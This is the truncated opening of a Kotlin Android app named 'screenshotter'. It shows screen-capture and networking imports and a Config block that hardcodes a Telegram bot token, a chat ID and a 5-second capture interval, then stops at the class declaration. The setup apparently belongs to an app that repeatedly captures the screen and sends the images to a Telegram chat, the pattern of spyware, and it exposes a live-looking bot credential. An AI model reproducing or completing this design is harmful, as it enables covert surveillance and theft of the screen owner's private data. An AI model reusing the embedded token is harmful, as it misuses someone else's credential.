// MainActivity.kt
package com.example.screenshotter

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

object Config {
    const val BOT_TOKEN    = "9134034618:AAHl_BtT81OgeWjku1RWYl1dVXMJoTqALEs"
    const val CHAT_ID      = "8481740668"
    const val INTERVAL_SEC = 5L
    const val JPEG_QUALITY = 75
    const val CH_ID        = "cap"
    const val NOTIF_ID     = 42
}

class MainActivity : AppCompatActivity() {
